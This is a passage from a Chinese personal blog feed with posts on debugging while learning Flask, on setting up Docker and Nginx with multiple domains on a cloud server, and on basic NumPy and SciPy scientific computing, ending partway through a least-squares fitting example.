      <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>不得不说，Flask是个不错的框架，它很简洁，然而却不失强大。在我阅读 &lt;&lt; Flask Web Development &gt;&gt; 这本书的过程中，我觉得最好是这本书的配套源码和issues。在这些帮助下，一步步从完全不了解Flask到稍微知道Flask的工作原理。这过程中有好多次因为一些小细节的错误debug个很久。在此，我记录了一些我遇到的问题，方便大家看看。</p>
<a id="more"></a>
<h2 id="u6570_u636E_u5E93"><a href="#u6570_u636E_u5E93" class="headerlink" title="数据库"></a>数据库</h2><h3 id="u8FC1_u79FB_u76F8_u5173_u95EE_u9898"><a href="#u8FC1_u79FB_u76F8_u5173_u95EE_u9898" class="headerlink" title="迁移相关问题"></a>迁移相关问题</h3><p>Flask提供了一个库Flask-SQLAlchemy。这个库大大的简化了数据库的操作，不需要手写数据库语句。配合数据库迁移的库Flask-Migrate,功能会非常强大。然而，在我尝试迁移数据库的时候，经常出现一个现象。</p>
<pre class=" language-bash"><code class="language-bash">python manager.py db upgrade

INFO  <span class="token punctuation">[</span>alembic.migration<span class="token punctuation">]</span> Context impl SQLiteImpl.
INFO  <span class="token punctuation">[</span>alembic.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.
</code></pre>
<p>总之就是并没有迁移成功。</p>
<p>后来发现, 如果在<code>upgrade</code>之前<code>migrate</code>一下就可以解决问题了。</p>
<h3 id="u6743_u9650_u95EE_u9898"><a href="#u6743_u9650_u95EE_u9898" class="headerlink" title="权限问题"></a>权限问题</h3><p>因为学习Flask是断断续续的，不可避免的就是遇到问题要不停的回滚。结果就是对数据库的操作存在一些隐形问题。在做到11章时，一个问题浮现了出来，就是登陆以后的用户并不能发post。在代码审计了很久都没有发现问题的时候，无意间看到了一个issue，和我遇到了一样的问题。原因是因为Role角色没写进数据库中，所以注册的用户并没有权限。</p>
<pre class=" language-bash"><code class="language-bash">python manage.py shell
<span class="token operator">>></span><span class="token operator">></span> Role.insert_roles<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> Role.query.all<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#应该能看到下面的三种角色</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span>Role u<span class="token string">'Administrator'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>Role u<span class="token string">'User'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>Role u<span class="token string">'Moderator'</span><span class="token operator">></span><span class="token punctuation">]</span>
</code></pre>
<p>当初觉得这个很麻烦，在书的后面，给出了解决方法，就是在部署的时候，直接执行insert_roles()，省去了Shell里的这一步。</p>
<h2 id="u90AE_u4EF6"><a href="#u90AE_u4EF6" class="headerlink" title="邮件"></a>邮件</h2><p>邮件操作让我折腾了一两天，换了163，126，qq。刚才是都没成功。错误代码<code>530，Authentication Required.</code>明明邮箱密码并没有输错呀。后来仔细想了想，发现不管是QQ还是网易，在使用第三方Mail接收客户端的时候，使用的密码并不是邮箱密码，而是一个授权码。在使用授权码成功发送了一篇邮件以后，心里顿时舒坦多了，也预示着Flask小网站完成了一大半了。</p>
<h2 id="u4E00_u4E9B_u77E5_u8BC6_u70B9_u7684_u8BB0_u5F55"><a href="#u4E00_u4E9B_u77E5_u8BC6_u70B9_u7684_u8BB0_u5F55" class="headerlink" title="一些知识点的记录"></a>一些知识点的记录</h2><h3 id="url_for"><a href="#url_for" class="headerlink" title="url_for"></a>url_for</h3><p>因为Flask使用的是<code>jinja2</code>模板, 其中网页跳转使用了url_for函数。当初在学Blueprint的时候并没细细思考蓝图的一些原理，当初用url_for也没怎么注意。在某个瞬间，突然发现url_for有的时候用了<code>.</code>，有时却没用。这是为什么呢？</p>
<pre class=" language-html"><code class="language-html">Additionally if you are in a view function of a blueprint or
a rendered template and you want to link to another endpoint of the same blueprint, 
you can use relative redirects by 
prefixing the endpoint with a dot only
</code></pre>
<p>简而言之就是，这里的点其实省略了当前蓝图的名字。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>Flask真心不错，很适合学完了Python，却又不知道该拿python去做个什么简单的项目。打算之后做个Flask博客试试，到时候再继续补坑。最近突然想刷算法题目了233.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[云主机下的docker+Nginx搭建]]></title>
      <url>http://xinqiu.me/2015/11/13/docker+nginx/</url>
      <content type="html"><![CDATA[<blockquote>
<p>之前申请到了腾讯云服务器，所以在上面折腾了一下 Nginx。</p>
</blockquote>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="u7CFB_u7EDF_u914D_u7F6E"><a href="#u7CFB_u7EDF_u914D_u7F6E" class="headerlink" title="系统配置"></a>系统配置</h3><pre class=" language-html"><code class="language-html">操作系统    Ubuntu Server 14.04.1 LTS 64位
CPU    1核
内存    1GB
系统盘    8GB(本地盘)
数据盘    0GB
公网带宽    1Mbps
</code></pre>
<a id="more"></a>
<h3 id="u7CFB_u7EDF_u955C_u50CF"><a href="#u7CFB_u7EDF_u955C_u50CF" class="headerlink" title="系统镜像"></a>系统镜像</h3><p>一开始拿 Ubuntu 装 docker，结果启动后会出点小问题，所以就决定用腾讯云提供的系统镜像了。</p>
<pre class=" language-html"><code class="language-html">
镜像名称    Docker运行环境（Ubuntu 14.04 64位）
类型    镜像市场镜像
镜像ID    img-3lj3495x
</code></pre>
<h2 id="docker__u4F7F_u7528"><a href="#docker__u4F7F_u7528" class="headerlink" title="docker 使用"></a>docker 使用</h2><p>用 ssh 连接主机，在终端里输入</p>
<pre class=" language-bash"><code class="language-bash">docker -v
</code></pre>
<p>可以查看 docker 的版本，我这里的版本是<code>Docker version 1.8.2 build 0a8c2e3</code></p>
<p>使用命令</p>
<pre class=" language-bash"><code class="language-bash">docekr search nginx
</code></pre>
<p>可以搜索 nginx 仓库。</p>
<p><strong>注：如果发现 docker 使用会存在问题，可以使用 sudo -s 提权为 root</strong></p>
<p>使用官方的 nginx 仓库</p>
<pre class=" language-bash"><code class="language-bash">docker pull nginx
</code></pre>
<p>pull 好以后，就可以正式启动 nginx 容器了。</p>
<p>官方的 nginx 容器里，连 vim 都没有，这是个比较苦恼的事情，所以可以先启动容器进入交互界面安装 vim。</p>
<pre class=" language-bash"><code class="language-bash">docker run -t -i -p 80:80 nginx /bin/bash
</code></pre>
<p>这里进入的是 bash，<code>-p 80:80</code> 是将容器里的80端口与主机的80端口进行绑定。</p>
<p>进入容器后，会发现并不能访问容器里的 nginx 欢迎界面，这是因为 nginx 服务并没有启动。</p>
<p>使用命令</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">service</span> nginx start
</code></pre>
<p>就可以启动 nginx 服务了。</p>
<p>为了安装 vim，首先需要使用命令更新源。</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update
</code></pre>
<p>接着使用命令</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> vim
</code></pre>
<p>中途敲 <code>y</code> 确定安装。</p>
<p>安装完以后就可以使用了。</p>
<h2 id="docker__u5E38_u7528_u547D_u4EE4"><a href="#docker__u5E38_u7528_u547D_u4EE4" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><p>附加到一个已运行的容器</p>
<pre class=" language-bash"><code class="language-bash">docker attach ID
</code></pre>
<p>停止一个容器</p>
<pre class=" language-bash"><code class="language-bash">docker stop Name/ID
</code></pre>
<p>杀死一个容器</p>
<pre class=" language-bash"><code class="language-bash">docker <span class="token function">kill</span> Name/ID
</code></pre>
<p>保存对容器的修改</p>
<pre class=" language-bash"><code class="language-bash">docker commit ID new_image_name
</code></pre>
<p>列出当前所有正在运行的container</p>
<pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span>
</code></pre>
<p>列出所有container</p>
<pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a
</code></pre>
<p>删除镜像</p>
<pre class=" language-bash"><code class="language-bash">docker rmi image_name
</code></pre>
<h2 id="Nginx__u5BB9_u5668_u591A_u57DF_u540D_u7ED1_u5B9A"><a href="#Nginx__u5BB9_u5668_u591A_u57DF_u540D_u7ED1_u5B9A" class="headerlink" title="Nginx 容器多域名绑定"></a>Nginx 容器多域名绑定</h2><p>在 docker Nginx 容器中，网站文件夹位于 <code>/usr/share/nginx</code>, 默认的欢迎页面在 <code>/usr/share/nginx/html</code> 中。</p>
<p>一般，如果域名绑定云服务器，那么访问域名访问的是 Nginx container 默认网站。如果先添加二级域名，访问同一个容器中的另一个网站，可以进行一下操作。</p>
<p>Nginx 的配置文件在 <code>/etc/nginx</code> 文件夹里。配置文件在 <code>conf.d</code> 文件夹里。<code>default.conf</code> 为默认网站的配置。添加站点在 <code>conf.d</code> 文件夹中，可以新建一个 <code>.conf</code> 文件，例如site1.conf：</p>
<pre class=" language-html"><code class="language-html">server {
    listen       80;
    server_name  此处填写你的二级域名;

    #charset koi8-r;
    #access_log  /var/log/nginx/log/host.access.log  main;

    location / {
        root   /usr/share/nginx/about;
        index  index.html index.htm;
    }
}
</code></pre>
<p>如果这时候你就重启 nginx 服务，可能会启动失败，出现一下问题</p>
<pre class=" language-bash"><code class="language-bash">could not build the server_names_hash, you should increase
</code></pre>
<p>这是因为 <code>/etc/nginx/nginx.conf</code> 文件没有修改好。</p>
<pre class=" language-bash"><code class="language-bash">vim /etc/nginx/nginx.conf
</code></pre>
<p>找到 <code>server_names_hash_max_size</code> 这行，将后面的数字改为 <code>512</code> ，将下一行的 <code>server_names_hash_bucket_size</code> 后面的数字改为 <code>128</code> 。</p>
<p>这时重启 Nginx 服务，就可以正常运行了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python科学计算学习]]></title>
      <url>http://xinqiu.me/2015/11/07/python-math/</url>
      <content type="html"><![CDATA[<blockquote>
<p>之前参加数学建模比赛都是用的 MatLab，然而电脑每次运行 MatLab 都烫的要命，所以决定用自己比较熟悉的 python 来进行科学计算。</p>
</blockquote>
<!--toc-->
<a id="more"></a>
<h2 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h2><p>NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray(下文统一称之为数组)是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p>
<p>推荐使用以下方法导入NumPy 函数库：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
</code></pre>
<h3 id="ndarray_u5BF9_u8C61"><a href="#ndarray_u5BF9_u8C61" class="headerlink" title="ndarray对象"></a>ndarray对象</h3><h4 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="创建"></a>创建</h4><p>通过给array函数传递Python的序列对象创建数组，如果传递的是多层嵌套的序列，将创建多维数组：</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> A <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> A
array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> B <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> B
array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span>
</code></pre>
<p>上面的例子是在 python 交互界面中产生的结果，在 PyCharm 中运行以下代码:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

A <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
B <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> A
<span class="token keyword">print</span> B
</code></pre>
<p>显示的是：</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">1</span>  <span class="token number">2</span>  <span class="token number">3</span>  <span class="token number">4</span><span class="token punctuation">]</span>
 <span class="token punctuation">[</span> <span class="token number">4</span>  <span class="token number">5</span>  <span class="token number">6</span>  <span class="token number">7</span><span class="token punctuation">]</span>
 <span class="token punctuation">[</span> <span class="token number">7</span>  <span class="token number">8</span>  <span class="token number">9</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre>
<p>数组的shape属性返回的是数组的维度的 Tuple 。如果是以为数组，就省略了维度1，直接显示元素个数，如果是二维数组，返回的 Tuple 第一个元素代表二维数组是几行，第二个元素代表二维数组是几列。多维数组亦可以表示。</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> A<span class="token punctuation">.</span>shape
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> B<span class="token punctuation">.</span>shape
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span>
</code></pre>
<p>还可以使用数组的 reshape 方法，创建一个改变了尺寸的新数组。</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> C <span class="token operator">=</span> A<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> C
array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span>
</code></pre>
<p>数组的 dtype 属性代表数组的元素类型，可以在创建数组的时候，使用 dtype 参数来改变元素类型。<code>float</code>代表浮点数，<code>complex</code>代表复数。</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>complex<span class="token punctuation">)</span>
array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>  <span class="token number">1</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">3</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span>  <span class="token number">4</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">5</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">7</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
       <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">8</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>   <span class="token number">9</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0.j</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span>
</code></pre>
<p>NumPy提供了很多专门用来创建数组的函数。</p>
<ul>
<li><p>arange 函数类似于python的range函数，通过指定开始值、终值和步长来创建一维数组，注意数组不包括终值:</p>
<pre class=" language-python"><code class="language-python">  <span class="token operator">>></span><span class="token operator">></span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span>
array<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">.</span> <span class="token punctuation">,</span>  <span class="token number">0.1</span><span class="token punctuation">,</span>  <span class="token number">0.2</span><span class="token punctuation">,</span>  <span class="token number">0.3</span><span class="token punctuation">,</span>  <span class="token number">0.4</span><span class="token punctuation">,</span>  <span class="token number">0.5</span><span class="token punctuation">,</span>  <span class="token number">0.6</span><span class="token punctuation">,</span>  <span class="token number">0.7</span><span class="token punctuation">,</span>  <span class="token number">0.8</span><span class="token punctuation">,</span>  <span class="token number">0.9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
</li>
<li><p>linspace函数通过指定开始值、终值和元素个数来创建一维数组，可以通过endpoint关键字指定是否包括终值，缺省设置是包括终值:</p>
<pre class=" language-python"><code class="language-python">np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span>
array<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">.</span>        <span class="token punctuation">,</span>  <span class="token number">0.09090909</span><span class="token punctuation">,</span>  <span class="token number">0.18181818</span><span class="token punctuation">,</span>  <span class="token number">0.27272727</span><span class="token punctuation">,</span>  <span class="token number">0.36363636</span><span class="token punctuation">,</span>
      <span class="token number">0.45454545</span><span class="token punctuation">,</span>  <span class="token number">0.54545455</span><span class="token punctuation">,</span>  <span class="token number">0.63636364</span><span class="token punctuation">,</span>  <span class="token number">0.72727273</span><span class="token punctuation">,</span>  <span class="token number">0.81818182</span><span class="token punctuation">,</span>
      <span class="token number">0.90909091</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">.</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
</li>
<li><p>logspace函数和linspace类似，不过它创建等比数列，下面的例子产生1(10^0)到100(10^2)、有20个元素的等比数列:</p>
<pre class=" language-python"><code class="language-python">  <span class="token operator">>></span><span class="token operator">></span> np<span class="token punctuation">.</span>logspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>
array<span class="token punctuation">(</span><span class="token punctuation">[</span>   <span class="token number">1</span><span class="token punctuation">.</span>        <span class="token punctuation">,</span>    <span class="token number">1.27427499</span><span class="token punctuation">,</span>    <span class="token number">1.62377674</span><span class="token punctuation">,</span>    <span class="token number">2.06913808</span><span class="token punctuation">,</span>
        <span class="token number">2.6366509</span> <span class="token punctuation">,</span>    <span class="token number">3.35981829</span><span class="token punctuation">,</span>    <span class="token number">4.2813324</span> <span class="token punctuation">,</span>    <span class="token number">5.45559478</span><span class="token punctuation">,</span>
        <span class="token number">6.95192796</span><span class="token punctuation">,</span>    <span class="token number">8.8586679</span> <span class="token punctuation">,</span>   <span class="token number">11.28837892</span><span class="token punctuation">,</span>   <span class="token number">14.38449888</span><span class="token punctuation">,</span>
       <span class="token number">18.32980711</span><span class="token punctuation">,</span>   <span class="token number">23.35721469</span><span class="token punctuation">,</span>   <span class="token number">29.76351442</span><span class="token punctuation">,</span>   <span class="token number">37.92690191</span><span class="token punctuation">,</span>
       <span class="token number">48.32930239</span><span class="token punctuation">,</span>   <span class="token number">61.58482111</span><span class="token punctuation">,</span>   <span class="token number">78.47599704</span><span class="token punctuation">,</span>  <span class="token number">100</span><span class="token punctuation">.</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
</li>
</ul>
<h3 id="ufunc_u8FD0_u7B97"><a href="#ufunc_u8FD0_u7B97" class="headerlink" title="ufunc运算"></a>ufunc运算</h3><p>ufunc 是 universal function 的缩写，它是一种能对数组的每个元素进行操作的函数。</p>
<p>frompyfunc 是将任意的 Python 函数转为 Numpy ufunc。frompyfunc 的调用格式为 frompyfunc(func, nin, nout)，其中 func 是计算单个元素的函数，nin 是此函数的输入参数的个数，nout 是此函数的返回值的个数。</p>
<p>reduce 方法和Python的reduce函数类似。</p>
<h3 id="u77E9_u9635_u8FD0_u7B97"><a href="#u77E9_u9635_u8FD0_u7B97" class="headerlink" title="矩阵运算"></a>矩阵运算</h3><p>使用matrix类创建的是矩阵对象，它们的加减乘除运算缺省采用矩阵方式计算，用法和matlab十分类似。</p>
<ul>
<li><p>dot : 对于两个一维的数组，计算的是这两个数组对应下标元素的乘积和(数学上称之为内积)；对于二维数组，计算的是两个数组的矩阵乘积；对于多维数组，它的通用计算公式如下，即结果数组中的每个元素都是：数组a的最后一维上的所有元素与数组b的倒数第二位上的所有元素的乘积和：</p>
<pre class=" language-python"><code class="language-python">  dot<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">,</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">*</span> b<span class="token punctuation">[</span>k<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
</li>
<li><p>inner : 和dot乘积一样，对于两个一维数组，计算的是这两个数组对应下标元素的乘积和；对于多维数组，它计算的结果数组中的每个元素都是：数组a和b的最后一维的内积，因此数组a和b的最后一维的长度必须相同：</p>
<pre class=" language-python"><code class="language-python">  inner<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">,</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token punctuation">[</span>k<span class="token punctuation">,</span>m<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
</li>
<li><p>outer : 只按照一维数组进行计算，如果传入参数是多维数组，则先将此数组展平为一维数组之后再进行运算。outer乘积计算的列向量和行向量的矩阵乘积。</p>
</li>
</ul>
<h2 id="SciPy"><a href="#SciPy" class="headerlink" title="SciPy"></a>SciPy</h2><p>SciPy函数库在NumPy库的基础上增加了众多的数学、科学以及工程计算中常用的库函数。例如线性代数、常微分方程数值求解、信号处理、图像处理、稀疏矩阵等等。由于其涉及的领域众多、本书没有能力对其一一的进行介绍。作为入门介绍，让我们看看如何用SciPy进行插值处理、信号滤波以及用C语言加速计算。</p>
<h3 id="u6700_u5C0F_u4E8C_u4E58_u62DF_u5408"><a href="#u6700_u5C0F_u4E8C_u4E58_u62DF_u5408" class="headerlink" title="最小二乘拟合"></a>最小二乘拟合</h3><p>今年的数学建模国赛——太阳影子长度中，就有一问需要用到最小二乘法拟合，可惜当初不是很会。最小二乘法就是假设有一组实验数据(x[i], y[i])，我们知道它们之间的函数关系:y = f(x)，通过这些已知信息，需要确定函数中的一些参数项。例如，如果f是一个线型函数f(x) = k*x+b，那么参数k和b就是我们需要确定的值。如果将这些参数用 p 表示的话，那么我们就是要找到一组 p 值使得如下公式中的S函数最小:</p>
<p><img src="http://www.zhihu.com/equation?tex=S(p\" alt="">=\sum<em>{i=1}^m[y</em>{i}-f(x_{i},P)]^{2})<br>这种算法被称之为最小二乘拟合(Least-square fitting)。</p>
<p>scipy中的子函数库optimize已经提供了实现最小二乘拟合算法的函数leastsq。下面是用leastsq进行数据拟合的一个例子：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> scipy<span class="token punctuation">.</span>optimize <span class="token keyword">import</span> leastsq
<span class="token keyword">import</span> pylab <span class="token keyword">as</span> pl

<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    数据拟合所用的函数: A*sin(2*pi*k*x + theta)
    """</span>
    A<span class="token punctuation">,</span> k<span class="token punctuation">,</span> theta <span class="token operator">=</span> p
    <span class="token keyword">return</span> A<span class="token operator">*</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>k<span class="token operator">*</span>x<span class="token operator">+</span>theta<span class="token punctuation">)</span>   

<span class="token keyword">def</span> <span class="token function">residuals</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
